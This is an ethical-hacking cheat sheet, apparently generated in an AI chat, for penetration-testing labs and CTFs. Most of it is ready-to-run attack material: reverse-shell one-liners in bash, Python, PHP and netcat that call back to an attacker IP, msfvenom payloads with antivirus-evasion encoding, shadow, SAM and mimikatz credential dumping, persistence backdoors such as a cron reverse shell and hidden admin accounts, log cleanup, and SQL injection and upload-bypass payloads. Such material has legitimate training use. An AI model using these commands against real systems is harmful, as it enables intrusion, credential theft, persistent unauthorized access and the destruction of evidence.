# Ethical Hacking Cheat Sheet

## Penetration Testing Labs

### Quick Navigation

1. [Reconnaissance & Scanning](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#reconnaissance--scanning)
2. [Web Application Testing](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#web-application-testing)
3. [Exploitation Techniques](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#exploitation-techniques)
4. [Privilege Escalation](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#privilege-escalation)
5. [Reverse Shells & Payloads](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#reverse-shells--payloads)
6. [Post-Exploitation](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#post-exploitation)
7. [Common Methodology](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#common-methodology)

***

### RECONNAISSANCE & SCANNING

#### NMAP - Network Mapping & Port Scanning

**Purpose**: Discover open ports, services, and OS information

```bash
# Basic scan - all 65535 ports
nmap <target>

# SYN scan (faster, requires root)
nmap -sS <target>

# UDP scan
nmap -sU <target>

# Scan specific ports
nmap -p 80,443,22 <target>

# Scan all ports with service version detection
nmap -p- -sV <target>

# Aggressive scan (version, OS detection, script scanning)
nmap -A <target>

# Output to multiple formats
nmap -A <target> -oN output.txt -oX output.xml -oG output.gnmap

# Ping sweep on subnet
nmap -sn 192.168.1.0/24

# OS detection
nmap -O <target>

# Service version detection
nmap -sV <target>

# Script scanning (NSE - Nmap Scripting Engine)
nmap --script vuln <target>
nmap --script smb-os-discovery <target>
nmap --script http-title <target>
```

#### MASSCAN - Ultra-fast Port Scanning

```bash
# Scan entire internet speed (use carefully)
masscan <target> -p0-65535 --rate=1000

# Save output
masscan <target> -p 1-65535 -oX output.xml
```

#### PING - Basic Connectivity Check

```bash
# Simple ping
ping <target>

# Ping with count (Linux/Mac)
ping -c 4 <target>

# Ping with timeout
ping -w 1000 <target>
```

***

### WEB APPLICATION TESTING

#### GOBUSTER - Directory & DNS Brute Force

**Purpose**: Find hidden directories, files, and subdomains

```bash
# Basic directory brute force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Extended list (slower, more thorough)
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Show status codes
gobuster dir -u http://<target> -w wordlist.txt -s "200,204,301,302,307,401,403"

# With common extensions
gobuster dir -u http://<target> -w wordlist.txt -x .php,.html,.txt,.zip

# DNS subdomain brute force
gobuster dns -d <target.com> -w wordlist.txt

# Faster, skip SSL cert validation
gobuster dir -u https://<target> -k -w wordlist.txt
```

#### NIKTO - Web Server Scanner

**Purpose**: Find vulnerabilities, misconfigurations, outdated components

```bash
# Basic scan
nikto -h http://<target>

# With specific port
nikto -h <target> -p 8080

# Aggressive scan (slow, thorough)
nikto -h http://<target> -A

# Output to file
nikto -h http://<target> -o report.html
```

#### CURL - Web Request Tool

**Purpose**: Manual HTTP requests, testing endpoints, grabbing headers

```bash
# Get headers only
curl -I http://<target>

# Follow redirects
curl -L http://<target>

# POST request with data
curl -X POST -d "param1=value1&param2=value2" http://<target>/endpoint

# With authentication
curl -u username:password http://<target>

# Send custom headers
curl -H "User-Agent: Mozilla/5.0" -H "Authorization: Bearer token" http://<target>

# JSON POST
curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' http://<target>

# Save response to file
curl http://<target> -o filename.html

# Verbose (see all headers and data)
curl -v http://<target>
```

#### SQLMAP - SQL Injection Testing

**Purpose**: Automate SQL injection detection and exploitation

```bash
# Basic SQL injection test on parameter
sqlmap -u "http://<target>/page?id=1" --dbs

# Crawl site and test all parameters
sqlmap -u "http://<target>" --crawl=2 --dbs

# Test POST parameter
sqlmap -u "http://<target>/login" --data="username=admin&password=pass" --dbs

# List tables in database
sqlmap -u "http://<target>/page?id=1" -D database_name --tables

# Dump table contents
sqlmap -u "http://<target>/page?id=1" -D database_name -T users --dump

# OS shell (if vulnerable)
sqlmap -u "http://<target>/page?id=1" --os-shell

# Batch mode (auto-answer yes)
sqlmap -u "http://<target>/page?id=1" --dbs --batch
```

#### BURP SUITE - Web Proxy & Testing

**Purpose**: Intercept, modify, and replay HTTP requests

```bash
# Not a CLI tool, but key features:
# 1. Start Burp and configure browser proxy to 127.0.0.1:8080
# 2. Intercept requests in Proxy tab
# 3. Modify and forward
# 4. Use Repeater to send custom requests
# 5. Use Intruder for parameter fuzzing
# 6. Use Scanner for vulnerability scanning
```

***

### EXPLOITATION TECHNIQUES

#### Common Web Exploits - Decision Logic

**IF URL has PHP or ASP:**

* Test for Local File Inclusion (LFI) / Remote File Inclusion (RFI)
* Check for arbitrary file upload vulnerability
* Look for code execution via include/require statements
* Try PHP wrappers: `?file=php://filter/convert.base64-encode/resource=config.php`

**IF Login Form Found:**

* Try default credentials
* SQL injection on login
* Brute force with hydra/hashcat
* Check for login page bypass (sqlmap)

**IF Upload Functionality Found:**

* Try uploading webshell (`.php`, `.asp`, `.jsp`)
* Bypass filters: `shell.php.txt`, `shell.phtml`, double extension
* Upload to accessible directory and execute
* Check for path traversal: `../../shell.php`

**IF Form with Input Fields:**

* Test for XSS (Cross-Site Scripting): `<script>alert('XSS')</script>`
* Test for CSRF (Cross-Site Request Forgery)
* Test for command injection: `; ls` or `| cat /etc/passwd`
* Test for XXE (XML External Entity): malformed XML payloads

#### HYDRA - Credential Brute Force

**Purpose**: Brute force login credentials

```bash
# SSH brute force
hydra -l username -P wordlist.txt ssh://<target>

# HTTP Basic Auth
hydra -l admin -P wordlist.txt http-head://<target>

# HTTP Form POST
hydra -l admin -P wordlist.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:Login failed"

# FTP
hydra -L usernames.txt -P passwords.txt ftp://<target>

# Multiple usernames
hydra -L users.txt -P wordlist.txt ssh://<target>

# Parallel threads (faster)
hydra -l admin -P wordlist.txt -t 16 ssh://<target>
```

#### METASPLOIT - Exploitation Framework

**Purpose**: Database of exploits, payload generation, automation

```bash
# Start msfconsole
msfconsole

# Inside msfconsole:
# Search for exploit
search http wordpress

# Use an exploit
use exploit/unix/webapp/wordpress_wp_custom_files_access

# Show options
show options

# Set required variables
set RHOST <target>
set LHOST <your-ip>
set LPORT 4444

# Run the exploit
run

# Generate payload (standalone)
msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe > shell.exe

# PHP payload
msfvenom -p php/reverse_php LHOST=<your-ip> LPORT=4444 -f raw > shell.php
```

***

### PRIVILEGE ESCALATION

#### Linux Privilege Escalation Checklist

```bash
# Check current user and groups
id
whoami
groups

# List sudo privileges (without password prompt)
sudo -l

# Check if sudo is available without password
sudo whoami

# Check SUID binaries (can escalate privileges)
find / -perm -4000 2>/dev/null

# Check for world-writable files
find / -perm -2 -type f 2>/dev/null

# List cron jobs
crontab -l

# Check system cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Check for unquoted paths in scripts
cat /root/script.sh

# Check kernel version (may have known exploits)
uname -r

# Check installed packages for known vulnerabilities
apt list --installed

# Check file permissions in /home
ls -la /home/
```

#### Windows Privilege Escalation Checklist

```bash
# Check current user
whoami
net user %username%

# List all users
net user

# Check local group membership
net localgroup administrators

# Look for stored credentials
dir C:\Users\%username%\AppData\Local\

# Check Windows version (may have known exploits)
systeminfo

# Check for unquoted service paths (common vuln)
wmic service list full | grep PathName

# Check scheduled tasks
schtasks /query /fo LIST /v

# Check for weak file permissions
icacls C:\
```

#### LINPEAS / WINPEAS - Automated Privilege Escalation Enumeration

```bash
# Run on target (Linux)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Run on target (Windows)
# Download winPEAS.exe
.\winPEAS.exe
```

***

### REVERSE SHELLS & PAYLOADS

#### What is a Reverse Shell?

* **Forward Shell**: You connect TO the target, target accepts your connection
* **Reverse Shell**: Target connects BACK to you, you get command execution
* **Common Use**: After exploiting a web app, you get reverse shell for full system access

#### Reverse Shell - Decision Logic

**IF you have code execution on the server (via PHP upload, command injection, etc.):**

1. Identify the server OS (Linux vs Windows)
2. Identify available interpreters (bash, python, netcat, etc.)
3. Set up listener on your machine: `nc -lvnp 4444`
4. Execute reverse shell command on target
5. You get interactive shell access

**IF target has restrictive firewall:**

* Try DNS tunneling
* Try HTTPS reverse shell
* Try bind shell instead (target listens, you connect)

#### Bash Reverse Shell

```bash
# Simple bash reverse shell
bash -i >& /dev/tcp/<your-ip>/4444 0>&1

# With exec
exec bash -i >& /dev/tcp/<your-ip>/4444 0>&1

# One-liner from PHP upload or command injection
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

#### Python Reverse Shell

```bash
# Python (Python 3)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Shorter version
python -c 'import socket,os,subprocess;s=socket.socket();s.connect(("<your-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

#### PHP Reverse Shell

```php
<?php
$sock=fsockopen("<your-ip>",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>

// Or one-liner for command injection:
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

#### Netcat Reverse Shell

```bash
# On target (if netcat available)
nc <your-ip> 4444 -e /bin/bash

# If -e not available
nc <your-ip> 4444 | /bin/bash | nc <your-ip> 4445
```

#### NC/NetCAT Listener (Your Machine)

```bash
# Listen for incoming reverse shell
nc -lvnp 4444

# Save output to file
nc -lvnp 4444 > shell_output.txt

# Multiple connections
nc -lvnp 4444 -k
```

#### MSFVENOM - Payload Generation

```bash
# Linux ELF payload
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# Windows EXE payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# PHP payload (for web shells)
msfvenom -p php/reverse_php LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# ASP payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp > shell.asp

# JSP payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.jsp

# Stageless payload (smaller)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Obfuscate to bypass AV
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o shell.exe
```

#### Upgrading Your Shell

```bash
# After getting basic shell, upgrade to interactive:

# Python upgrade
python -c 'import pty; pty.spawn("/bin/bash")'

# Or if python not available
echo "import pty;pty.spawn('/bin/bash')" | python

# Then in shell press Ctrl+Z, then on your terminal:
stty raw -echo
fg
export TERM=xterm
```

***

### POST-EXPLOITATION

#### Data Enumeration Commands

**Linux/Unix**

```bash
# Find sensitive files
find / -name "*password*" 2>/dev/null
find / -name "*.txt" -type f 2>/dev/null
find / -name "*.conf" -type f 2>/dev/null

# Search for files modified recently
find / -mtime -7 2>/dev/null

# Look for config files
find / -name "*.cnf" -o -name "*.conf" -o -name "*.config" 2>/dev/null

# Find SSH keys
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null

# Look for web app source code
find /var/www -type f 2>/dev/null
find /home -name "*.php" -o -name "*.asp" 2>/dev/null
```

**Windows**

```batch
# Get system information
systeminfo

# Get network configuration
ipconfig /all

# List all users
net user

# Get user in domain
net user /domain

# List groups
net localgroup
net localgroup administrators

# Get processes
tasklist /v

# Get environment variables
set

# Search for files (Windows)
dir /s /p "C:\Users" | find "password"
```

#### Credential Dumping

**Linux - Shadow File**

```bash
# If you have root access
cat /etc/shadow

# Try to crack hashes
john shadow.txt --wordlist=wordlist.txt
hashcat -m 1800 shadow.txt wordlist.txt
```

**Windows - SAM Database**

```bash
# Using Metasploit
hashdump  # In meterpreter session

# Manual extraction (requires SYSTEM privileges)
reg save HKLM\SAM sam.reg
reg save HKLM\SYSTEM system.reg

# Offline dump using tools like samdump2, pwdump
```

**Memory Dumping (Mimikatz - Windows)**

```bash
# Download mimikatz or use in meterpreter
load mimikatz
mimikatz_command -f samlsadump::sam
creds_all
```

#### Persistence (Maintaining Access)

**Linux Persistence**

```bash
# Add backdoor SSH key
echo "your-public-ssh-key" >> ~/.ssh/authorized_keys

# Add cron job (execute reverse shell every 5 min)
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/IP/PORT 0>&1") | crontab -

# Create hidden user account
useradd -m -p $(openssl passwd -1 password123) -s /bin/bash backdoor
```

**Windows Persistence**

```batch
# Add user account
net user backdoor password123 /add
net localgroup administrators backdoor /add

# Schedule task
schtasks /create /tn "WindowsUpdate" /tr "C:\path\to\shell.exe" /sc minute /mo 5

# Registry run key
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v malware /t REG_SZ /d "C:\path\to\shell.exe"
```

***

### COMMON METHODOLOGY

#### Phase 1: Reconnaissance

```
1. Download the lab machine/VM
2. Import into VirtualBox/VMware
3. Start the machine
4. Find its IP address: nmap -sn 192.168.x.0/24
```

#### Phase 2: Scanning & Enumeration

```
1. nmap -A <target-ip>        [Detailed scan]
2. nikto -h http://<target>   [Web vulns]
3. gobuster dir -u ...        [Find hidden paths]
4. Banner grabbing with curl
5. List all discovered services and their versions
```

#### Phase 3: Vulnerability Analysis

```
Decision Tree:

Does it have a WEB SERVER (80, 443, 8080)?
├─ YES → Check for: WordPress, Joomla, custom apps
│  ├─ Default credentials? [Try: admin/admin, admin/password]
│  ├─ Known vulnerability? [Use searchsploit, Metasploit]
│  └─ Custom upload/input? [Test for LFI, RFI, XSS, SQLi, command injection]
│
Does it have SSH (22)?
├─ YES → Check version for known exploits
│  ├─ Weak credentials? [Hydra brute force]
│  └─ SSH key access? [Enumerate users]
│
Does it have other services (FTP, SMB, RDP)?
└─ Check for misconfigurations, default creds, known exploits
```

#### Phase 4: Exploitation

```
1. Identify vector: web app, weak creds, known exploit
2. Gain initial access (foothold)
3. Create reverse shell if needed
4. Upgrade to interactive shell
5. Document what was exploited
```

#### Phase 5: Privilege Escalation

```
1. Run: id, whoami, sudo -l
2. Run: linpeas.sh or enumeration script
3. Check for: SUID binaries, weak file permissions, kernel exploits
4. Exploit to get root/admin
```

#### Phase 6: Post-Exploitation

```
1. Enumerate system (users, files, network)
2. Look for flags (CTF) or data
3. Dump credentials if needed
4. Establish persistence (for real pentests only)
5. Clean up logs
```

#### Quick Decision Flowchart for Initial Exploitation

```
Target Found (e.g., 192.168.1.50)
    ↓
Run: nmap -A 192.168.1.50
    ↓
[Service Found]
    ├─ HTTP/HTTPS (80/443/8080)?
    │  └─ Run: nikto + gobuster
    │     ├─ Find login? → Hydra/SQLmap
    │     ├─ Find upload? → Web shell
    │     ├─ Find form? → XSS/SQLi/RCE
    │     └─ Find PHP? → Try LFI/RFI
    │
    ├─ SSH (22)?
    │  └─ Check version → searchsploit
    │     ├─ Vuln found? → Metasploit
    │     └─ No vuln? → Hydra brute force
    │
    └─ Other (FTP/SMB/RDP)?
       └─ Check version + try defaults
    ↓
[Got Access]
    ├─ Can execute commands? → Reverse shell
    └─ SSH/RDP? → Interactive already
    ↓
[Escalate Privileges]
    └─ Run: sudo -l / find SUID / linpeas.sh
    ↓
[ROOT/ADMIN]
    └─ Find flags / dump data / document findings
```

***

### Useful Wordlists & Resources

```bash
# Common wordlist locations in Kali Linux
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/

# Download common wordlists
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt

# Generate custom wordlist
crunch 8 8 0123456789 > passwords.txt
```

### Quick Reference - File Uploads

```
Extensions to try: .php, .phtml, .php3, .php4, .php5, .php7, .pht, .phps, .phar, .inc
Double extensions: .php.jpg, .php.txt, .jpg.php
Null byte: .php%00.jpg
Content-Type bypass: Upload .php but set Content-Type: image/jpeg
Archive bomb: Upload .zip containing webshell
```

### Quick Reference - SQL Injection Payloads

```
' OR '1'='1
admin' --
' OR 1=1 --
' UNION SELECT NULL,NULL,NULL --
'; DROP TABLE users; --
' UNION ALL SELECT version(),NULL,NULL --
```

